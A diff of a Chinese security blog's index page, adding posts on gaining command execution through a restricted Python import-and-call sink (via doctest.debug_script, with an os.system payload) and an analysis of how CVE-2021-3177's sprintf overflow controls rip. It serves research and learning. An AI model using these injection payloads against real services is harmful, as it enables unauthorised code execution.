+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuzz_object(o):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param o:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    for k in o.__dict__:  </span><br><span class="line">        # print(k)</span><br><span class="line">        v &#x3D; o.__dict__[k]</span><br><span class="line">        if callable(v):   # 遍历模块所有的函数</span><br><span class="line">            try:</span><br><span class="line">                v(b&quot;xxxx&quot;, AnyClass())   # 如果函数接受两个参数，且第一个参数是bytes类型，第二个参数可以是任意实例，就把函数名打印出来。</span><br><span class="line">                print(o.__file__, k)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    abs_path &#x3D; &quot;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;python&#x2F;3.7.7&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.7&#x2F;lib&#x2F;python3.7&quot;</span><br><span class="line">    for i in os.listdir(abs_path):  # 遍历Python自带的基础库</span><br><span class="line">        if os.path.isfile(abs_path + &quot;&#x2F;&quot; + i):</span><br><span class="line">            imp_module &#x3D; re.sub(r&#39;\.py$&#39;, &quot;&quot;, i)</span><br><span class="line">            try:</span><br><span class="line">                ip_module &#x3D; importlib.import_module(imp_module)</span><br><span class="line"></span><br><span class="line">                fuzz_object(ip_module)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                print(_)</span><br><span class="line">            except KeyboardInterrupt:</span><br><span class="line">                pass</span><br><span class="line">        elif i not in [&quot;.&quot;, &quot;..&quot;]:  # 这里就不处理目录了</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
+
+<p>结果测出很多函数都可以正常运行，没有报错。</p>
+<p>先说最终结论，<code>doctest.debug_script</code>函数完全满足要求</p>
+<p>测试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;doctest&quot;</span><br><span class="line">user_input_function &#x3D; &quot;debug_script&quot;</span><br><span class="line">user_input_argument &#x3D; &quot;import os;os.system(&#39;touch &#x2F;tmp&#x2F;qwer&#39;)&quot;  # 执行 touch &#x2F;tmp&#x2F;qwer</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())</span><br></pre></td></tr></table></figure>
+
+<p>测试过程中，也发现有很多其他的部分满足需求的函数，这里也一并记录。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">os.getenvb  可以读环境变量</span><br><span class="line"></span><br><span class="line">eval(xx,&#123;&#125;) 可以命令执行，但是需要第二个参数是dict</span><br><span class="line"></span><br><span class="line">pickletools.dis  输出opcode</span><br><span class="line"></span><br><span class="line">webbrowser.open(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;,object)</span><br><span class="line"></span><br><span class="line">.&#x2F;idlelib&#x2F;calltip.get_entity</span><br><span class="line"></span><br><span class="line">timeit.timeit()  符合要求</span><br><span class="line"></span><br><span class="line">os.fwalk</span><br><span class="line"></span><br><span class="line">doctest.debug_script  完全符合要求，可以用来命令执行</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>寻找满足特定条件的X时，用遍历的思想让程序去找，总会有点收获。</p>
+<p>在另外一次针对bash脚本代码审计时也用到了这个简单但有效果的方法，找到了突破点。后面会写一篇介绍 ：）</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-CPython%E7%9A%84%E7%BA%BF%E7%A8%8B%E4%B8%8EGIL/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1134,7 +1316,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E6%A0%88%E6%BA%A2%E5%87%BACVE-2021-3177%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1147,7 +1329,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/" class="post-title-link" itemprop="url">Python命令执行Case</a>
+          <a href="/2021-12-26-Python%E6%A0%88%E6%BA%A2%E5%87%BACVE-2021-3177%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Python栈溢出CVE-2021-3177分析</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1171,190 +1353,63 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在一次安全评估过程中，遇到了一个命令执行的点，但是存在部分限制。</p>
-<p>服务是用Python写的，漏洞点的代码精简一下大概如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;&quot;   # 用户可控</span><br><span class="line">user_input_function &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">user_input_argument &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())   # 第二个参数必须存在</span><br></pre></td></tr></table></figure>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>我正在学习缓冲区溢出，同时又对各个语言的安全问题感兴趣。最近看到 <a target="_blank" rel="noopener" href="https://bugs.python.org/issue42938">Python CVE-2021-3177</a> ，所以分析一下。</p>
+<p>从描述上看，这是一个sprintf函数引发的栈溢出漏洞。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>因为本文主要分析的和Python执行流程关系不大，所以也可以忽略第一步调试环境搭建，直接看调试分析。</p>
+<ol>
+<li><p>搭建调试环境</p>
+<p> 我用的IDE是Clion</p>
+<p> 先搭建Python调试环境，编译出可调试的Python二进制程序。这一步可以参考官网 <a target="_blank" rel="noopener" href="https://devguide.python.org/">Guide</a></p>
+<p> 准备好漏洞测试的Python代码</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from ctypes import *</span><br><span class="line">x &#x3D; c_double.from_param(1e300)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>调试分析</p>
+<p> 在<code>_ctypes/callproc.c</code>下面代码打好断点</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">case &#39;d&#39;:</span><br><span class="line">    sprintf(buffer, &quot;&lt;cparam &#39;%c&#39; (%f)&gt;&quot;,</span><br><span class="line">        self-&gt;tag, self-&gt;value.d);  &#x2F;&#x2F; 1e300</span><br><span class="line">    break;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<p>大概就是 <code>任意模块.任意函数(任意字符串,不可控的实例参数)</code> 。</p>
-<p>因为第二个参数必须存在，所以不能简单的调用 <code>os.system</code>函数来执行命令。</p>
-<p>我的想法就变成，怎么找到一个方法能够执行命令，且这个方法有两个参数，且第二个参数不影响命令执行。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>想到去遍历Python库，来看看有没有满足上述条件的方法。</p>
-<p>于是写了一小段代码来遍历Python默认安装的所有模块，扔给指定参数来尝试调用模块中的方法。如果没有报错，就打印函数后人工排查一下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuzz_object(o):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param o:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    for k in o.__dict__:  </span><br><span class="line">        # print(k)</span><br><span class="line">        v &#x3D; o.__dict__[k]</span><br><span class="line">        if callable(v):   # 遍历模块所有的函数</span><br><span class="line">            try:</span><br><span class="line">                v(b&quot;xxxx&quot;, AnyClass())   # 如果函数接受两个参数，且第一个参数是bytes类型，第二个参数可以是任意实例，就把函数名打印出来。</span><br><span class="line">                print(o.__file__, k)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    abs_path &#x3D; &quot;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;python&#x2F;3.7.7&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.7&#x2F;lib&#x2F;python3.7&quot;</span><br><span class="line">    for i in os.listdir(abs_path):  # 遍历Python自带的基础库</span><br><span class="line">        if os.path.isfile(abs_path + &quot;&#x2F;&quot; + i):</span><br><span class="line">            imp_module &#x3D; re.sub(r&#39;\.py$&#39;, &quot;&quot;, i)</span><br><span class="line">            try:</span><br><span class="line">                ip_module &#x3D; importlib.import_module(imp_module)</span><br><span class="line"></span><br><span class="line">                fuzz_object(ip_module)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                print(_)</span><br><span class="line">            except KeyboardInterrupt:</span><br><span class="line">                pass</span><br><span class="line">        elif i not in [&quot;.&quot;, &quot;..&quot;]:  # 这里就不处理目录了</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
+<p> 在IDE中可以看到 self-&gt;value.d 是double类型，且值就是我们传入的参数。</p>
+<p> 从这里可以看出来，这个CVE漏洞和下面这段C代码漏洞是一样的</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">  char buf[2];</span><br><span class="line">  double s&#x3D;1e300;  &#x2F;&#x2F;s值用户可控</span><br><span class="line"></span><br><span class="line">  sprintf(buf, &quot;%f&quot;, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>结果测出很多函数都可以正常运行，没有报错。</p>
-<p>先说最终结论，<code>doctest.debug_script</code>函数完全满足要求</p>
-<p>测试一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;doctest&quot;</span><br><span class="line">user_input_function &#x3D; &quot;debug_script&quot;</span><br><span class="line">user_input_argument &#x3D; &quot;import os;os.system(&#39;touch &#x2F;tmp&#x2F;qwer&#39;)&quot;  # 执行 touch &#x2F;tmp&#x2F;qwer</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())</span><br></pre></td></tr></table></figure>
+<p> 所以接下来我就去研究学习上面的C代码中漏洞是怎么利用的。</p>
+</li>
+<li><p>sprintf引起的栈溢出分析</p>
+<p> <a target="_blank" rel="noopener" href="https://book.51cto.com/art/201311/419419.htm">网上文章</a>分析sprintf溢出都以<code>sprintf(buf, &quot;%s&quot;, s);</code>举例</p>
+<p> 对于 “%s” 格式符这种覆盖很容易理解，如果s=”a…a” 很多a字符时，就可以将rip覆盖成”\x6161616161616161”。</p>
+<p> 对于 “%f” 这种用浮点数字去覆盖buf变量，我就有一个疑问，浮点数怎么控制rip指针。比如s=11111111111111112222222233333333.0时，rip会被覆盖成什么？</p>
+<p> 先说自己的结论：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在漏洞代码中，double浮点数可以用来向很大内存中写入 &#96;\x30-\x39&#96;、&#96;\x2e&#96; 的字节。</span><br><span class="line"></span><br><span class="line">* 只能写入&#96;\x30-\x39&#96;、&#96;\x2e&#96;，而不能写其他字节，是因为 %f 转换成小数只能有&#96;[0-9.]&#96;，数字1-9对应的十六进制就是 &#96;\x30&#96;-&#96;\x39&#96;</span><br><span class="line">* 能覆盖多大的内存？</span><br><span class="line">    * 因为double类型，表示的小数位数能很大，所以至少可以覆盖300个字节</span><br><span class="line">    * 如果是float类型，就要小的多了</span><br></pre></td></tr></table></figure>
 
-<p>测试过程中，也发现有很多其他的部分满足需求的函数，这里也一并记录。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">os.getenvb  可以读环境变量</span><br><span class="line"></span><br><span class="line">eval(xx,&#123;&#125;) 可以命令执行，但是需要第二个参数是dict</span><br><span class="line"></span><br><span class="line">pickletools.dis  输出opcode</span><br><span class="line"></span><br><span class="line">webbrowser.open(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;,object)</span><br><span class="line"></span><br><span class="line">.&#x2F;idlelib&#x2F;calltip.get_entity</span><br><span class="line"></span><br><span class="line">timeit.timeit()  符合要求</span><br><span class="line"></span><br><span class="line">os.fwalk</span><br><span class="line"></span><br><span class="line">doctest.debug_script  完全符合要求，可以用来命令执行</span><br></pre></td></tr></table></figure>
+<p> 结论是怎么来的呢？</p>
+<p> 首先我们要知道浮点数在计算机并不总是能够精确的被表示，只能被近似表示。更具体的细节需要去了解”浮点数在计算机中的存储”，可以看文末的参考资料。</p>
+<p> 所以 <code>double s=11111111111111112222222233333333.0</code> 在内存中，s的值并不一定是 <code>11111111111111112222222233333333.0</code></p>
+<p> 我在代码中加了一行<code>printf(&quot;%f\n&quot;,s);</code>打印s变量实际的值。</p>
+<p> 从下面的分析来看，在64位系统上 11111111111111112222222233333333.0 会把rip覆盖成”\x30\x38\x30\x32\x34\x33\x35\x33”。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">  char buf[2];</span><br><span class="line">  double s&#x3D;11111111111111112222222233333333.0; &#x2F;&#x2F;16个1，8个2，8个3</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; s实际的值是 1111111111111111 19575513 35342080.000000</span><br><span class="line">  &#x2F;&#x2F;            buf栈            rbp      rip</span><br><span class="line">  printf(&quot;%f\n&quot;,s);</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line"></span><br><span class="line">  print(&quot;&quot;.join([hex(ord(i)).replace(&quot;0x&quot;,&quot;\\x&quot;) for i in &quot;35342080&quot;]))</span><br><span class="line">  &quot;35342080&quot;字符串对应 \x33\x35\x33\x34\x32\x30\x38\x30</span><br><span class="line"></span><br><span class="line">  &gt;&gt;&gt; x&#x3D;[hex(ord(i)).replace(&quot;0x&quot;,&quot;\\x&quot;) for i in &quot;35342080&quot;]</span><br><span class="line">  &gt;&gt;&gt; x.reverse()</span><br><span class="line">  &gt;&gt;&gt; print(&quot;&quot;.join(x))</span><br><span class="line">  \x30\x38\x30\x32\x34\x33\x35\x33</span><br><span class="line"></span><br><span class="line">  *&#x2F;</span><br><span class="line">  &#x2F;&#x2F; 所以rip会被覆盖成 \x30\x38\x30\x32\x34\x33\x35\x33</span><br><span class="line">  &#x2F;&#x2F; gdb验证后，符合预期</span><br><span class="line"></span><br><span class="line">  sprintf(buf, &quot;%f&quot;, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>_ctypes/callproc.c</code>其他代码有没有相同的栈溢出问题？<br> self-&gt;value.d在_ctypes/ctypes.h文件有定义，是一个union数据类型。</p>
+<p> 这个union类型中看着好像还有几个字段也能用在sprintf栈溢出中，如下：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">union &#123;</span><br><span class="line">    char c;</span><br><span class="line">    char b;</span><br><span class="line">    short h;</span><br><span class="line">    int i;</span><br><span class="line">    long l;</span><br><span class="line">    long long q;</span><br><span class="line">    long double D; &#x2F;&#x2F; 可以利用</span><br><span class="line">    double d;  &#x2F;&#x2F; 可以利用</span><br><span class="line">    float f;  &#x2F;&#x2F; 能覆盖的内存有限</span><br><span class="line">    void *p;  &#x2F;&#x2F; 可能可以</span><br><span class="line">&#125; value;</span><br></pre></td></tr></table></figure>
 
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>寻找满足特定条件的X时，用遍历的思想让程序去找，总会有点收获。</p>
-<p>在另外一次针对bash脚本代码审计时也用到了这个简单但有效果的方法，找到了突破点。后面会写一篇介绍 ：）</p>
+<p> 在 _ctypes/callproc.c 文件看了看，结论是只有d变量可以利用。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">union &#123;</span><br><span class="line">    ...</span><br><span class="line">    long double D; &#x2F;&#x2F; 没有用到这个变量</span><br><span class="line">    double d;  &#x2F;&#x2F; 可以利用</span><br><span class="line">    float f;  &#x2F;&#x2F; 能覆盖的内存有限</span><br><span class="line">    void *p;  &#x2F;&#x2F; 因为只用到了 %p 打印地址，没有 %s ，所以也无法利用</span><br><span class="line">&#125; value;</span><br></pre></td></tr></table></figure>
 
-      
-    </div>
+<p> _ctypes/callproc.c文件中，也只有下面的代码sprintf d变量。所以只有这一处是存在栈溢出的。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">case &#39;d&#39;:</span><br><span class="line">    sprintf(buffer, &quot;&lt;cparam &#39;%c&#39; (%f)&gt;&quot;,</span><br><span class="line">        self-&gt;tag, self-&gt;value.d);  &#x2F;&#x2F; 1e300</span><br><span class="line">    break;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E5%BA%93%E7%9A%84ReDos%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-Python%E5%BA%93%E7%9A%84ReDos%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/" class="post-title-link" itemprop="url">Python库的ReDos漏洞检测</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>  之前分析了<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jw0vPIvgCdt1090j3-Sxqw">正则表达式原理与ReDos攻击</a>，最近尝试检测Python常用库是否存在ReDos问题。</p>
-<p>  我的思路是：</p>
+</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>  本文仅仅分析了参数怎么控制rip指针，其中我学习到的点是”浮点数在内存中的表示”。</p>
+<p>  关于漏洞还有其他很多方面都没有分析，比如：</p>
 <ul>
-<li>先看看有没有人已经做过”挖掘常用库的ReDos”工作</li>
-<li>下载Python的常用库，写程序自动检测库中的ReDos问题</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="已有的研究"><a href="#已有的研究" class="headerlink" title="已有的研究"></a>已有的研究</h2><p>这篇2018年的论文<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2723">JavaScript Web服务器ReDoS漏洞分析</a>中</p>
-<p>研究人员先下载了热门的npm模块，然后提取正则表达式，最后测试正则表达式是否存在漏洞。最终发现存在ReDos漏洞的库影响超过339个主流网站。</p>
-<p>其中的一点细节：</p>
-<ul>
-<li>通过遍历JavaScript代码的AST提取正则表达式<ul>
-<li>traversing the abstract syntax trees of the JavaScript code</li>
-<li>removing regular expressions that contain no repetitions</li>
+<li>怎么自动化检测这种漏洞？</li>
+<li>漏洞的实际影响是什么？<ul>
+<li>有多少Python应用存在漏洞？</li>
 </ul>
 </li>
-<li>半人工地测试正则表达式是否存在漏洞</li>
+<li>漏洞触发的调用链是什么？</li>
 </ul>
-<h2 id="检测Python常用库的ReDos问题"><a href="#检测Python常用库的ReDos问题" class="headerlink" title="检测Python常用库的ReDos问题"></a>检测Python常用库的ReDos问题</h2><p>检测目标（基本都是我之前写Python项目时装的一些库）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flask</span><br><span class="line">django</span><br><span class="line">bottle</span><br><span class="line">scikit-learn</span><br><span class="line">pymysql</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>用Python的<code>ast</code>模块解析出库里Python代码中所有的字符串常量，把这些字符串常量都当作正则字符串，最后用<a target="_blank" rel="noopener" href="https://github.com/superhuman/rxxr2">rxxr2</a>工具检测是否存在ReDos问题。</p>
-<p>代码见 <a target="_blank" rel="noopener" href="https://github.com/leveryd/regex_test/blob/master/find_vuln_pattern.py">find_vuln_pattern.py</a> 文件</p>
-<h3 id="检出结果"><a href="#检出结果" class="headerlink" title="检出结果"></a>检出结果</h3><p>所有的漏洞结果在<a target="_blank" rel="noopener" href="https://github.com/leveryd/regex_test/blob/master/results/RESULTS.md">RESULTS.md</a>，验证了部分结果，提交了三个issue。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/scikit-learn/scikit-learn/issues/19522">https://github.com/scikit-learn/scikit-learn/issues/19522</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/PyMySQL/PyMySQL/issues/967">https://github.com/PyMySQL/PyMySQL/issues/967</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/scrapinghub/dateparser/issues/869">https://github.com/scrapinghub/dateparser/issues/869</a></p>
